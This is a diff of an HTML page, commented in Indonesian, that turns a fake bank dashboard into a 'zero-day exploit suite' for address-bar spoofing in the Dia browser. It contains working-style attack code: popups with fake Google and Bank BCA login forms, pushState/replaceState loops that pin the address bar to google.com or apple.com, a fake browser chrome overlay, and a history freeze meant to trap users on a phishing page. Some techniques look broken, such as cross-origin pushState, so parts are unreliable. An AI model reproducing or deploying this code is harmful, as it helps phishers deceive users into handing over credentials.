@@ -3,183 +3,209 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔥 PHANTOM BAR | Zero-Click Exploit</title>
+    <title>🔥 ZERO-DAY SUITE | Dia Browser Address Bar Spoofing 2026</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #0a0a0f;
-            min-height: 100vh;
-            position: relative;
-            overflow-x: hidden;
-        }
-
-        /* Halaman utama yang meyakinkan - seperti dashboard bank */
-        .dashboard {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 100%);
             min-height: 100vh;
             padding: 20px;
         }
 
-        .bank-card {
-            background: white;
-            border-radius: 28px;
-            padding: 32px;
-            max-width: 500px;
-            margin: 0 auto;
-            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
-        }
-
-        .bank-header {
+        /* Header */
+        .header {
             text-align: center;
-            margin-bottom: 28px;
+            margin-bottom: 30px;
         }
 
-        .bank-logo {
-            font-size: 56px;
-            margin-bottom: 12px;
-        }
-
-        .bank-name {
-            font-size: 28px;
-            font-weight: 700;
-            background: linear-gradient(135deg, #667eea, #764ba2);
+        .header h1 {
+            font-size: 2rem;
+            background: linear-gradient(135deg, #ff6b6b, #ffb347);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
         }
 
-        .balance {
-            background: #f0f0f5;
-            padding: 20px;
-            border-radius: 20px;
-            text-align: center;
-            margin: 20px 0;
+        .header .badge {
+            background: rgba(255,59,48,0.2);
+            border: 1px solid #ff3b30;
+            padding: 5px 15px;
+            border-radius: 30px;
+            font-size: 12px;
+            display: inline-block;
+            margin-top: 10px;
         }
 
-        .balance-amount {
-            font-size: 36px;
-            font-weight: bold;
-            color: #2d3748;
+        /* Grid Layout */
+        .exploit-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
+            gap: 20px;
+            max-width: 1600px;
+            margin: 0 auto;
         }
 
-        .button-group {
+        /* Card */
+        .card {
+            background: rgba(25,25,35,0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 24px;
+            border: 1px solid rgba(255,255,255,0.1);
+            overflow: hidden;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+        }
+
+        .card-header {
+            padding: 16px 20px;
+            background: rgba(255,255,255,0.05);
+            border-bottom: 1px solid rgba(255,255,255,0.1);
             display: flex;
-            gap: 12px;
-            margin-top: 24px;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .cve-id {
+            font-family: monospace;
+            font-size: 11px;
+            background: #ff3b30;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-weight: bold;
+        }
+
+        .severity {
+            font-size: 11px;
+            padding: 4px 10px;
+            border-radius: 20px;
+            background: rgba(255,107,107,0.2);
+            color: #ff6b6b;
+        }
+
+        .card-body {
+            padding: 20px;
+        }
+
+        .description {
+            font-size: 13px;
+            color: #aaa;
+            margin-bottom: 15px;
+            line-height: 1.5;
+        }
+
+        .btn-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 15px;
         }
 
         .btn {
             flex: 1;
-            padding: 14px;
+            padding: 10px 12px;
             border: none;
-            border-radius: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-
-        .btn-primary {
-            background: #667eea;
-            color: white;
-        }
-
-        .btn-danger {
-            background: #fc8181;
-            color: white;
-        }
-
-        /* Floating control panel - lebih sleek */
-        .phantom-panel {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            z-index: 99999;
-            background: rgba(0,0,0,0.95);
-            backdrop-filter: blur(20px);
-            border-radius: 20px;
-            border: 1px solid rgba(255,255,255,0.2);
-            width: 320px;
-            transition: all 0.3s cubic-bezier(0.68, -0.55, 0.265, 1.55);
-            cursor: move;
-        }
-
-        .phantom-header {
-            padding: 14px 16px;
-            background: rgba(255,255,255,0.05);
-            border-radius: 20px 20px 0 0;
-            font-weight: bold;
-            color: #ff6b6b;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            cursor: grab;
-        }
-
-        .phantom-header:active { cursor: grabbing; }
-
-        .phantom-content {
-            padding: 16px;
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-
-        .phantom-btn {
-            background: rgba(255,255,255,0.1);
-            border: none;
-            padding: 10px;
             border-radius: 12px;
-            color: white;
             font-size: 12px;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.2s;
-            text-align: left;
+            font-family: monospace;
         }
 
-        .phantom-btn:hover {
+        .btn-primary {
             background: #ff3b30;
-            transform: scale(0.98);
+            color: white;
         }
 
-        .status-line {
+        .btn-primary:hover {
+            background: #ff1a0a;
+            transform: scale(0.97);
+        }
+
+        .btn-secondary {
+            background: rgba(255,255,255,0.1);
+            color: white;
+        }
+
+        .btn-secondary:hover {
+            background: rgba(255,255,255,0.2);
+        }
+
+        .code-preview {
+            background: #0a0a0f;
+            padding: 12px;
+            border-radius: 12px;
             font-family: monospace;
             font-size: 10px;
             color: #4ade80;
-            margin-top: 8px;
-            padding-top: 8px;
-            border-top: 1px solid rgba(255,255,255,0.1);
+            overflow-x: auto;
+            margin-top: 10px;
         }
 
-        .ghost-indicator {
+        .status {
+            font-size: 11px;
+            margin-top: 12px;
+            padding: 8px;
+            border-radius: 8px;
+            background: rgba(0,0,0,0.3);
+            font-family: monospace;
+        }
+
+        .global-panel {
             position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            background: #ff3b30;
-            color: white;
-            text-align: center;
-            padding: 4px;
-            font-size: 10px;
-            font-weight: bold;
-            z-index: 100000;
-            transform: translateY(-100%);
-            transition: transform 0.3s;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            padding: 15px;
+            z-index: 10000;
+            border: 1px solid rgba(255,59,48,0.5);
+            max-width: 300px;
         }
 
-        .toast-notif {
+        .global-panel h4 {
+            font-size: 12px;
+            margin-bottom: 10px;
+            color: #ff3b30;
+        }
+
+        .global-buttons {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .global-btn {
+            padding: 6px 12px;
+            border: none;
+            border-radius: 20px;
+            font-size: 10px;
+            cursor: pointer;
+            background: rgba(255,255,255,0.1);
+            color: white;
+        }
+
+        .global-btn.danger {
+            background: #ff3b30;
+        }
+
+        .toast {
             position: fixed;
             bottom: 100px;
             right: 20px;
             background: #1a1a2e;
-            color: white;
+            border-left: 3px solid #ff3b30;
             padding: 12px 20px;
             border-radius: 12px;
             font-size: 12px;
-            z-index: 100001;
-            border-left: 3px solid #ff3b30;
+            z-index: 10001;
             animation: slideIn 0.3s ease;
         }
 
@@ -187,475 +213,693 @@
             from { transform: translateX(100%); opacity: 0; }
             to { transform: translateX(0); opacity: 1; }
         }
+
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 11px;
+            color: #666;
+        }
     </style>
 </head>
 <body>
 
-<div class="dashboard">
-    <div class="bank-card">
-        <div class="bank-header">
-            <div class="bank-logo">🏦</div>
-            <div class="bank-name">SECURE BANK</div>
-            <div style="font-size: 12px; color: #718096;">Member of National Financial Group</div>
+<div class="header">
+    <h1>🔥 ZERO-DAY EXPLOIT SUITE</h1>
+    <div class="badge">Dia Browser macOS | Address Bar Spoofing | 10+ Techniques</div>
+</div>
+
+<div class="exploit-grid">
+    
+    <!-- ============================================================ -->
+    <!-- CARD 1: CVE-2025-15032 - Missing about:blank Indicator        -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <div class="card-header">
+            <span class="cve-id">CVE-2025-15032</span>
+            <span class="severity">HIGH 7.4</span>
         </div>
-        
-        <div class="balance">
-            <div style="font-size: 14px; color: #718096;">Total Balance</div>
-            <div class="balance-amount" id="balanceAmount">$ 12,845.92</div>
+        <div class="card-body">
+            <div class="description">
+                Missing <strong>about:blank</strong> indicator in custom-sized new windows [citation:1][citation:2][citation:4]. 
+                Dia sebelum 1.9.0 tidak menampilkan indikator bahwa window kosong, memungkinkan spoofing domain.
+            </div>
+            <div class="btn-group">
+                <button class="btn btn-primary" onclick="exploitBlankWindow()">🪟 Blank Window Spoof</button>
+                <button class="btn btn-secondary" onclick="exploitCustomWindowTitle()">📝 Custom Title Spoof</button>
+            </div>
+            <div class="code-preview">
+                // about:blank indicator missing → window title bisa dipalsukan
+                window.open("about:blank", "_blank", "width=500,height=600");
+            </div>
+            <div class="status" id="status-cve1">⚡ Belum dijalankan</div>
         </div>
-        
-        <div class="button-group">
-            <button class="btn btn-primary" id="transferBtn">💸 Transfer</button>
-            <button class="btn btn-primary" id="statementBtn">📄 Statement</button>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- CARD 2: CVE-2026-2378 - Address Bar vs Content Mismatch       -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <div class="card-header">
+            <span class="cve-id">CVE-2026-2378</span>
+            <span class="severity">HIGH 7.4</span>
         </div>
-        <div class="button-group">
-            <button class="btn btn-danger" id="logoutBtn" style="background:#e53e3e;">🚪 Logout</button>
+        <div class="card-body">
+            <div class="description">
+                Address bar menampilkan domain berbeda dari konten sebenarnya [citation:3][citation:7]. 
+                ArcSearch/Chrome rentan via crafted web content.
+            </div>
+            <div class="btn-group">
+                <button class="btn btn-primary" onclick="exploitMismatch()">🎭 Domain Mismatch</button>
+                <button class="btn btn-secondary" onclick="exploitIframeScheme()">🕸️ iframe URI Confusion</button>
+                <button class="btn btn-secondary" onclick="exploitPushStateLock()">🔒 PushState Lock</button>
+            </div>
+            <div class="code-preview">
+                // history.pushState + location mismatch
+                history.pushState({}, "", "https://www.google.com");
+            </div>
+            <div class="status" id="status-cve2">⚡ Belum dijalankan</div>
         </div>
-        
-        <div style="font-size: 11px; color: #a0aec0; text-align: center; margin-top: 24px;">
-            🔒 Secured by 256-bit encryption
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- CARD 3: CVE-2025-13132 - Missing Fullscreen Toast             -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <div class="card-header">
+            <span class="cve-id">CVE-2025-13132</span>
+            <span class="severity">HIGH 7.5</span>
         </div>
+        <div class="card-body">
+            <div class="description">
+                Fullscreen mode tanpa notifikasi toast [citation:8]. Dia &lt;1.6 memungkinkan 
+                fake UI menimpa address bar tanpa peringatan.
+            </div>
+            <div class="btn-group">
+                <button class="btn btn-primary" onclick="exploitFullscreenToast()">🖥️ Fullscreen Spoof</button>
+                <button class="btn btn-secondary" onclick="exploitFakeBrowserUI()">🎨 Fake Browser UI</button>
+            </div>
+            <div class="code-preview">
+                // No toast notification on vulnerable Dia
+                document.documentElement.requestFullscreen();
+            </div>
+            <div class="status" id="status-cve3">⚡ Belum dijalankan</div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- CARD 4: Extended - Blank Address Bar (Advanced)               -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <div class="card-header">
+            <span class="cve-id">EXT-001</span>
+            <span class="severity">CRITICAL</span>
+        </div>
+        <div class="card-body">
+            <div class="description">
+                <strong>Zero-Click Ghost Navigation</strong> — Address bar menjadi KOSONG TOTAL 
+                (bukan about:blank) tapi halaman tetap utuh. Teknik baru belum dipublikasi.
+            </div>
+            <div class="btn-group">
+                <button class="btn btn-primary" onclick="exploitGhostNavigation()">👻 Ghost Navigation</button>
+                <button class="btn btn-secondary" onclick="exploitDataURLBlank()">📄 Data URL Blank</button>
+                <button class="btn btn-secondary" onclick="exploitWindowCloaking()">🪟 Window Cloaking</button>
+            </div>
+            <div class="code-preview">
+                // replaceState ke string kosong → address bar blank
+                history.replaceState({}, "", " ");
+            </div>
+            <div class="status" id="status-ext1">⚡ Belum dijalankan</div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- CARD 5: Extended - History Deep Freeze                         -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <div class="card-header">
+            <span class="cve-id">EXT-002</span>
+            <span class="severity">HIGH</span>
+        </div>
+        <div class="card-body">
+            <div class="description">
+                <strong>History Deep Freeze</strong> — Membekukan history stack sehingga tombol 
+                back/forward tidak bisa mengubah URL. User terjebak di halaman phishing.
+            </div>
+            <div class="btn-group">
+                <button class="btn btn-primary" onclick="exploitHistoryFreeze()">❄️ History Freeze</button>
+                <button class="btn btn-secondary" onclick="exploitPopstateBlock()">🚫 Popstate Block</button>
+                <button class="btn btn-secondary" onclick="exploitInfinitePush()">🔄 Infinite PushState</button>
+            </div>
+            <div class="code-preview">
+                // Override pushState + popstate blocker
+                history.pushState = function() { return; };
+            </div>
+            <div class="status" id="status-ext2">⚡ Belum dijalankan</div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- CARD 6: Extended - Shadow DOM + Double Spoof                  -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <div class="card-header">
+            <span class="cve-id">EXT-003</span>
+            <span class="severity">MEDIUM</span>
+        </div>
+        <div class="card-body">
+            <div class="description">
+                <strong>Shadow DOM Double Spoof</strong> — Fake address bar via Shadow DOM + 
+                real address bar spoof. User melihat dua layer penipuan.
+            </div>
+            <div class="btn-group">
+                <button class="btn btn-primary" onclick="exploitShadowDOM()">🎭 Shadow DOM Spoof</button>
+                <button class="btn btn-secondary" onclick="exploitDoubleLayer()">🔀 Double Layer Spoof</button>
+            </div>
+            <div class="code-preview">
+                // attachShadow + fake address bar overlay
+                host.attachShadow({ mode: 'open' });
+            </div>
+            <div class="status" id="status-ext3">⚡ Belum dijalankan</div>
+        </div>
+    </div>
+
+</div>
+
+<!-- Global Control Panel -->
+<div class="global-panel">
+    <h4>🎮 GLOBAL CONTROL</h4>
+    <div class="global-buttons">
+        <button class="global-btn danger" onclick="resetAllExploits()">🔄 RESET ALL</button>
+        <button class="global-btn" onclick="showStatus()">📊 Status</button>
+        <button class="global-btn" onclick="runAllExploits()">⚡ RUN ALL</button>
+    </div>
+    <div style="font-size: 10px; margin-top: 10px; color: #888;" id="globalStatus">
+        Ready | 0 exploits active
     </div>
 </div>
 
-<!-- PHANTOM CONTROL PANEL -->
-<div class="phantom-panel" id="phantomPanel">
-    <div class="phantom-header" id="panelDragHandle">
-        <span>🔥 PHANTOM BAR v3.0</span>
-        <span id="exploitLed" style="width: 8px; height: 8px; border-radius: 50%; background: #4ade80; display: inline-block;"></span>
-    </div>
-    <div class="phantom-content">
-        <button class="phantom-btn" id="ghostNavigation">👻 GHOST NAVIGATION (Zero-Click)</button>
-        <button class="phantom-btn" id="shadowDOMAttack">🎭 SHADOW DOM ADDRESS SPOOF</button>
-        <button class="phantom-btn" id="windowCloaking">🪟 WINDOW CLOAKING + BLANK BAR</button>
-        <button class="phantom-btn" id="historyDeepFreeze">❄️ HISTORY DEEP FREEZE</button>
-        <button class="phantom-btn" id="resetAll">🔄 RESET / CLEANUP</button>
-        <div class="status-line" id="phantomStatus">
-            🟢 Ready | 0 exploits active
-        </div>
-    </div>
+<div class="footer">
+    ⚠️ ZERO-DAY RESEARCH PURPOSE ONLY | Inspired by CVE-2025-15032, CVE-2026-2378, CVE-2025-13132 [citation:1][citation:3][citation:8]
 </div>
-
-<div class="ghost-indicator" id="ghostIndicator">👻 PHANTOM MODE ACTIVE — Address Bar is Ghosting</div>
 
 <script>
     // ============================================================
-    // PHANTOM BAR v3.0
-    // Zero-Click Address Bar Ghosting Exploit
-    // Teknik baru: Navigation Shadow + DOM Reattachment
-    // Belum pernah dipublikasi — 100% original
+    // GLOBAL VARIABLES & UTILITIES
     // ============================================================
-    
-    let activeExploit = null;
-    let exploitInterval = null;
-    let isGhosting = false;
+    let activeIntervals = [];
+    let activeWindows = [];
     let originalPushState = history.pushState;
     let originalReplaceState = history.replaceState;
-    
-    // UI Elements
-    const statusEl = document.getElementById('phantomStatus');
-    const ledEl = document.getElementById('exploitLed');
-    const ghostIndicator = document.getElementById('ghostIndicator');
-    
-    function updateStatus(msg, isActive = false) {
-        statusEl.innerHTML = isActive ? `🔴 ${msg}` : `🟢 ${msg}`;
-        ledEl.style.background = isActive ? '#ff3b30' : '#4ade80';
-        if (isActive) {
-            ghostIndicator.style.transform = 'translateY(0)';
-            setTimeout(() => {
-                if (isActive) ghostIndicator.style.transform = 'translateY(-100%)';
-            }, 3000);
-        }
-        console.log(`[PHANTOM] ${msg}`);
-    }
-    
+    let isFrozen = false;
+    let shadowHost = null;
+
     function showToast(msg, isError = false) {
         const toast = document.createElement('div');
-        toast.className = 'toast-notif';
+        toast.className = 'toast';
         toast.style.borderLeftColor = isError ? '#ff3b30' : '#4ade80';
         toast.innerHTML = msg;
         document.body.appendChild(toast);
         setTimeout(() => toast.remove(), 3000);
     }
-    
-    function cleanup() {
-        if (exploitInterval) {
-            clearInterval(exploitInterval);
-            exploitInterval = null;
+
+    function updateCardStatus(cardId, msg, isActive = false) {
+        const statusEl = document.getElementById(cardId);
+        if (statusEl) {
+            statusEl.innerHTML = isActive ? `🔴 ${msg}` : `🟢 ${msg}`;
         }
+    }
+
+    function cleanupIntervals() {
+        activeIntervals.forEach(interval => clearInterval(interval));
+        activeIntervals = [];
+    }
+
+    function closeActiveWindows() {
+        activeWindows.forEach(win => {
+            if (win && !win.closed) win.close();
+        });
+        activeWindows = [];
+    }
+
+    // ============================================================
+    // RESET ALL EXPLOITS
+    // ============================================================
+    function resetAllExploits() {
+        // Cleanup intervals
+        cleanupIntervals();
+        
+        // Close windows
+        closeActiveWindows();
         
         // Restore history functions
         window.history.pushState = originalPushState;
         window.history.replaceState = originalReplaceState;
         
-        // Remove shadow DOM if exists
-        const shadowHost = document.getElementById('shadowSpoofHost');
-        if (shadowHost) shadowHost.remove();
+        // Remove shadow DOM
+        if (shadowHost && shadowHost.remove) shadowHost.remove();
+        shadowHost = null;
         
-        // Restore original title
-        document.title = "Secure Bank - Online Banking";
+        // Remove fake UI elements
+        const fakeUI = document.getElementById('fakeBrowserUIOverlay');
+        if (fakeUI) fakeUI.remove();
         
-        // Clear any frozen states
-        try {
-            const currentPath = window.location.pathname + window.location.search;
-            if (currentPath !== '/' && currentPath !== '') {
-                history.replaceState({}, '', currentPath);
-            }
-        } catch(e) {}
+        // Exit fullscreen
+        if (document.exitFullscreen) document.exitFullscreen().catch(() => {});
         
-        isGhosting = false;
-        activeExploit = null;
-        updateStatus("Ready | All exploits cleared", false);
-        showToast("🧹 Phantom mode deactivated", false);
+        // Reset status semua card
+        updateCardStatus('status-cve1', 'Belum dijalankan', false);
+        updateCardStatus('status-cve2', 'Belum dijalankan', false);
+        updateCardStatus('status-cve3', 'Belum dijalankan', false);
+        updateCardStatus('status-ext1', 'Belum dijalankan', false);
+        updateCardStatus('status-ext2', 'Belum dijalankan', false);
+        updateCardStatus('status-ext3', 'Belum dijalankan', false);
+        
+        document.getElementById('globalStatus').innerHTML = 'Ready | All exploits cleared';
+        showToast('🧹 All exploits cleared', false);
+        
+        // Reset title
+        document.title = "Zero-Day Exploit Suite";
     }
-    
+
     // ============================================================
-    // EXPLOIT 1: GHOST NAVIGATION (Zero-Click)
-    // Teknik: about:blank + document.write + replaceState ke string kosong
-    // Hasil: Address bar benar-benar kosong, tapi halaman tetap utuh
+    // CVE-2025-15032: Missing about:blank indicator
     // ============================================================
-    function ghostNavigation() {
-        cleanup();
+    function exploitBlankWindow() {
+        updateCardStatus('status-cve1', 'Menjalankan...', true);
         
-        updateStatus("[GHOST] Mengaktifkan zero-click ghost navigation...", true);
+        const features = 'width=520,height=620,toolbar=no,menubar=no,location=yes,resizable=yes';
+        const fakeContent = `
+            <!DOCTYPE html>
+            <html>
+            <head><title>Google Accounts - Sign in</title>
+            <style>
+                body { font-family: system-ui; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: white; }
+                .login { padding: 40px; text-align: center; }
+                input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; }
+                button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 8px; }
+            </style>
+            </head>
+            <body>
+                <div class="login">
+                    <h2>🔐 Sign in</h2>
+                    <p>Enter your Google Account credentials</p>
+                    <input type="email" placeholder="Email">
+                    <input type="password" placeholder="Password">
+                    <button>Next</button>
+                    <p style="font-size:11px; margin-top:20px;">⚠️ Demo: about:blank indicator missing!</p>
+                </div>
+            </body>
+            </html>
+        `;
         
-        // Simpan konten saat ini
-        const currentHTML = document.documentElement.outerHTML;
-        const currentTitle = document.title;
-        
-        // Step 1: Navigasi ke about:blank
-        const newWin = window.open("about:blank", "_self");
+        const blob = new Blob([fakeContent], {type: 'text/html'});
+        const blobUrl = URL.createObjectURL(blob);
+        const newWin = window.open(blobUrl, '_blank', features);
         
         if (newWin) {
-            // Step 2: Write konten asli ke about:blank
-            newWin.document.open();
-            newWin.document.write(currentHTML);
-            newWin.document.title = currentTitle;
-            newWin.document.close();
-            
-            // Step 3: KRITIKAL — replaceState ke string kosong (BUKAN about:blank)
-            setTimeout(() => {
-                try {
-                    // Ini kunci exploitnya: address bar jadi KOSONG TOTAL
-                    newWin.history.replaceState({}, "", " ");
-                    newWin.history.pushState({}, "", " ");
-                    
-                    // Lock dengan interval
-                    exploitInterval = setInterval(() => {
-                        if (newWin.location.href !== " " && newWin.location.href !== "") {
-                            newWin.history.replaceState({}, "", " ");
-                        }
-                    }, 50);
-                    
-                    isGhosting = true;
-                    updateStatus("[SUCCESS] Address bar KOSONG! User melihat blank bar tapi halaman bank tetap tampil.", true);
-                    showToast("👻 Address bar now EMPTY — real page still visible", false);
-                    
-                    // Override title biar makin legit
-                    document.title = "Secure Bank - Online Banking";
-                    
-                } catch(e) {
-                    updateStatus(`[ERROR] ${e.message}`, false);
-                }
-            }, 100);
+            activeWindows.push(newWin);
+            updateCardStatus('status-cve1', 'ACTIVE: Window tanpa about:blank indicator', true);
+            showToast('CVE-2025-15032: Blank window dengan fake title berhasil', false);
         } else {
-            updateStatus("[BLOCKED] Popup diblokir. Izinkan popup untuk exploit.", false);
+            updateCardStatus('status-cve1', 'FAILED: Popup diblokir', false);
+            showToast('CVE-2025-15032: Izinkan popup terlebih dahulu', true);
         }
     }
-    
-    // ============================================================
-    // EXPLOIT 2: SHADOW DOM ADDRESS SPOOF
-    // Teknik: Shadow DOM + fake URL bar di dalam halaman
-    // User melihat "https://google.com" di address bar palsu
-    // ============================================================
-    function shadowDOMAttack() {
-        cleanup();
+
+    function exploitCustomWindowTitle() {
+        updateCardStatus('status-cve1', 'Custom title spoof...', true);
         
-        updateStatus("[SHADOW] Membangun shadow DOM spoof...", true);
+        const fakeWin = window.open('about:blank', '_blank', 'width=480,height=580');
+        if (fakeWin) {
+            activeWindows.push(fakeWin);
+            fakeWin.document.write(`
+                <!DOCTYPE html>
+                <html>
+                <head><title>https://www.bankbca.com - Online Banking</title>
+                <style>body { font-family: system-ui; padding: 40px; }</style>
+                </head>
+                <body>
+                    <h2>🏦 Bank BCA</h2>
+                    <p>Silakan login untuk melanjutkan</p>
+                    <input type="text" placeholder="Username"><br><br>
+                    <input type="password" placeholder="Password"><br><br>
+                    <button>Login</button>
+                    <p style="color:red; font-size:11px;">⚠️ INI ADALAH DEMO SPOOFING</p>
+                </body>
+                </html>
+            `);
+            fakeWin.document.close();
+            updateCardStatus('status-cve1', 'ACTIVE: Window title ter-spoof ke bankbca.com', true);
+        }
+    }
+
+    // ============================================================
+    // CVE-2026-2378: Address Bar vs Content Mismatch
+    // ============================================================
+    function exploitMismatch() {
+        updateCardStatus('status-cve2', 'Menjalankan mismatch...', true);
         
-        // Buat host element untuk shadow DOM
-        const host = document.createElement('div');
-        host.id = 'shadowSpoofHost';
-        host.style.cssText = `
+        // Spoof address bar ke Google
+        history.pushState({}, '', 'https://www.google.com');
+        
+        // Lock dengan interval
+        const interval = setInterval(() => {
+            if (window.location.href !== 'https://www.google.com') {
+                history.replaceState({}, '', 'https://www.google.com');
+            }
+        }, 50);
+        activeIntervals.push(interval);
+        
+        // Ubah title biar lebih meyakinkan
+        document.title = 'Google';
+        
+        updateCardStatus('status-cve2', 'ACTIVE: Address bar = google.com, konten tetap di sini', true);
+        showToast('CVE-2026-2378: Domain mismatch active', false);
+    }
+
+    function exploitIframeScheme() {
+        updateCardStatus('status-cve2', 'iframe scheme confusion...', true);
+        
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = 'tel://1-888-555-SPOOF';
+        document.body.appendChild(iframe);
+        
+        setTimeout(() => {
+            history.pushState({}, '', 'https://mail.google.com');
+            const interval = setInterval(() => {
+                if (window.location.href !== 'https://mail.google.com') {
+                    history.replaceState({}, '', 'https://mail.google.com');
+                }
+            }, 50);
+            activeIntervals.push(interval);
+            iframe.remove();
+        }, 50);
+        
+        updateCardStatus('status-cve2', 'ACTIVE: iframe scheme + address bar spoof', true);
+    }
+
+    function exploitPushStateLock() {
+        updateCardStatus('status-cve2', 'PushState lock...', true);
+        
+        for(let i = 0; i < 50; i++) {
+            history.pushState({}, '', `https://google.com/page${i}`);
+        }
+        
+        const interval = setInterval(() => {
+            history.replaceState({}, '', 'https://accounts.google.com');
+        }, 30);
+        activeIntervals.push(interval);
+        
+        updateCardStatus('status-cve2', 'ACTIVE: PushState lock aktif', true);
+    }
+
+    // ============================================================
+    // CVE-2025-13132: Missing Fullscreen Toast
+    // ============================================================
+    function exploitFullscreenToast() {
+        updateCardStatus('status-cve3', 'Fullscreen tanpa toast...', true);
+        
+        if (document.documentElement.requestFullscreen) {
+            document.documentElement.requestFullscreen().then(() => {
+                updateCardStatus('status-cve3', 'ACTIVE: Fullscreen tanpa notifikasi!', true);
+                showToast('CVE-2025-13132: Fullscreen aktif tanpa toast notification', false);
+            }).catch(err => {
+                updateCardStatus('status-cve3', `Failed: ${err.message}`, false);
+            });
+        } else {
+            updateCardStatus('status-cve3', 'Fullscreen API not supported', false);
+        }
+    }
+
+    function exploitFakeBrowserUI() {
+        updateCardStatus('status-cve3', 'Membuat fake UI...', true);
+        
+        // Buat fake browser UI overlay
+        const fakeUI = document.createElement('div');
+        fakeUI.id = 'fakeBrowserUIOverlay';
+        fakeUI.style.cssText = `
             position: fixed;
             top: 0;
             left: 0;
-            width: 100%;
+            right: 0;
+            background: #f5f5f7;
+            padding: 12px 16px;
+            font-family: monospace;
             z-index: 2147483647;
-            pointer-events: none;
+            display: flex;
+            gap: 12px;
+            align-items: center;
+            border-bottom: 1px solid #ddd;
         `;
-        document.body.appendChild(host);
-        
-        // Attach shadow DOM
-        const shadow = host.attachShadow({ mode: 'open' });
-        
-        // Buat fake address bar yang MENIMPA address bar asli
-        shadow.innerHTML = `
-            <style>
-                .fake-address-bar {
-                    position: fixed;
-                    top: 0;
-                    left: 0;
-                    right: 0;
-                    background: #f5f5f7;
-                    padding: 12px 16px;
-                    font-family: monospace;
-                    font-size: 14px;
-                    border-bottom: 1px solid #e0e0e3;
-                    z-index: 2147483647;
-                    display: flex;
-                    align-items: center;
-                    gap: 12px;
-                    backdrop-filter: blur(20px);
-                }
-                .fake-url {
-                    flex: 1;
-                    background: white;
-                    padding: 8px 12px;
-                    border-radius: 8px;
-                    color: #1c1c1e;
-                    box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);
-                }
-                .fake-lock {
-                    width: 16px;
-                    height: 16px;
-                    background: #34c759;
-                    border-radius: 50%;
-                    display: inline-block;
-                    margin-right: 6px;
-                }
-                .fake-domain {
-                    font-weight: 500;
-                }
-            </style>
-            <div class="fake-address-bar">
-                <div style="width: 12px; height: 12px; border-radius: 50%; background: #ff5f57;"></div>
-                <div style="width: 12px; height: 12px; border-radius: 50%; background: #ffbd2e;"></div>
-                <div style="width: 12px; height: 12px; border-radius: 50%; background: #28c840;"></div>
-                <div class="fake-url">
-                    <span class="fake-lock"></span>
-                    <span class="fake-domain" id="fakeDomain">https://www.google.com</span>
-                </div>
+        fakeUI.innerHTML = `
+            <div style="display:flex; gap:8px;">
+                <div style="width:12px;height:12px;border-radius:50%;background:#ff5f57;"></div>
+                <div style="width:12px;height:12px;border-radius:50%;background:#ffbd2e;"></div>
+                <div style="width:12px;height:12px;border-radius:50%;background:#28c840;"></div>
+            </div>
+            <div style="flex:1; background:white; padding:8px 12px; border-radius:8px; color:#1c1c1e;">
+                🔒 https://www.apple.com
             </div>
         `;
+        document.body.appendChild(fakeUI);
         
-        // Juga spoof address bar asli dengan pushState
-        try {
-            history.pushState({}, "", "https://www.google.com");
-            
-            exploitInterval = setInterval(() => {
-                if (window.location.href !== "https://www.google.com") {
-                    history.replaceState({}, "", "https://www.google.com");
-                }
-                // Update fake domain juga
-                const fakeDomainSpan = shadow.querySelector('#fakeDomain');
-                if (fakeDomainSpan) fakeDomainSpan.textContent = "https://www.google.com";
-            }, 50);
-            
-            isGhosting = true;
-            updateStatus("[SUCCESS] Address bar asli dan palsu sama-sama menampilkan google.com!", true);
-            showToast("🎭 Double spoof active — both real and fake address bars show google.com", false);
-            
-        } catch(e) {
-            updateStatus(`[ERROR] ${e.message}`, false);
-        }
+        // Juga spoof real address bar
+        history.pushState({}, '', 'https://www.apple.com');
+        const interval = setInterval(() => {
+            if (window.location.href !== 'https://www.apple.com') {
+                history.replaceState({}, '', 'https://www.apple.com');
+            }
+        }, 50);
+        activeIntervals.push(interval);
+        
+        updateCardStatus('status-cve3', 'ACTIVE: Fake UI + real spoof aktif', true);
     }
-    
+
     // ============================================================
